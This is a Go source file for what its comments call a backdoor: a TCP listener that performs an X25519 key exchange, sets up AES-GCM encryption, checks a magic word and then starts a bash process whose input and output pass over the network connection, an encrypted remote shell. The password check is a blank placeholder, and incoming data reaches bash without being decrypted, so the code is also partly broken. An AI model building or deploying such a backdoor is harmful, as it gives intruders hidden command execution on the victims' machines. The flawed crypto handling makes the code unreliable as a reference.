package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"

	"golang.org/x/crypto/hkdf"
)

func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, msg, info)
	return ct
}

func open(buf []byte, info []byte, gcm cipher.AEAD) ([]byte, error) {
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, info)
}

func errThread(stderr io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stderr.Read(buf)
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func sendThread(stdout io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stdout.Read(buf)
		// The process pipe has closed
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func recvThread(stdin io.WriteCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := conn.Read(buf)
		// The connection has closed from the other end
		if err != nil {
			stdin.Write([]byte("exit\n"))
			break
		}
		stdin.Write(buf[:r])
	}
}

func endConnection(conn net.Conn) {
	fmt.Println("Closing connection...")
	conn.Close()
}

// Handles initial connection from a client to this backdoor
func handleConnection(conn net.Conn) {
	defer endConnection(conn)
	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
	var priv, _ = ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	var pub = priv.PublicKey()

	// First packet sent by client is supposed to be a public key
	// of length 32, and is also supposed to be on the curve
	buf := make([]byte, 1024)
	readLen, err := conn.Read(buf)
	if err != nil || readLen != 32 {
		println("Wrong length")
		return
	}
	// Bytes to public key
	remote, err := ecdh.X25519().NewPublicKey(buf[:readLen])
	if err != nil {
		return
	}

	// Compute shared key
	shared, err := priv.ECDH(remote)
	if err != nil {
		println("Unable to compute shared key")
		return
	}
	kdf := hkdf.New(sha256.New, shared, nil, nil)
	var gcmKey [32]byte
	var hmacKey [32]byte
	kdf.Read(gcmKey[:])
	kdf.Read(hmacKey[:])

	// Make a cipher
	c, _ := aes.NewCipher(gcmKey[:])
	gcm, _ := cipher.NewGCM(c)

	// Make an associated data with all of our sent packets
	info := []byte(conn.LocalAddr().String() + conn.RemoteAddr().String())
	hm := hmac.New(sha256.New, hmacKey[:])
	hm.Write(info)
	info = hm.Sum(nil)

	// Send the client our public key
	writeLen, err := conn.Write(pub.Bytes())
	if err != nil || writeLen != 32 {
		fmt.Println("Unable to send our public key")
		return
	}

	// Check that the next message is a magic word
	readLen, _ = conn.Read(buf)
	tempBuf := buf[:readLen]
	pt, err := open(tempBuf, info, gcm)
	if err != nil {
		fmt.Println("Decryption failed")
		return
	}
	if string(pt) != "foobar" {
		fmt.Println("Wrong magic word for protocol")
		return
	}

	// Ack the connection
	// Todo create easy to use seal function
	conn.Write([]byte("ack"))

	// Check the password for this backdoor

	// Start the shell
	fmt.Println("Starting bash")
	bash := exec.Command("bash")
	stdin, _ := bash.StdinPipe()
	stdout, _ := bash.StdoutPipe()
	stderr, _ := bash.StderrPipe()
	bash.Start()

	// Start thread for listening and sending
	go errThread(stderr, conn, gcm, info[:])
	go sendThread(stdout, conn, gcm, info[:])
	go recvThread(stdin, conn, gcm, info[:])
	bash.Wait()
}

const (
	CONN_HOST = "localhost"
	CONN_PORT = "3333"
	CONN_TYPE = "tcp"
)

func main() {
	// Begin listening for connections
	sock, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	// Close listening socket at the end of application
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	defer sock.Close()

	for {
		conn, err := sock.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			continue
		}
		// Handle connection in new goroutine
		go handleConnection(conn)
	}
}
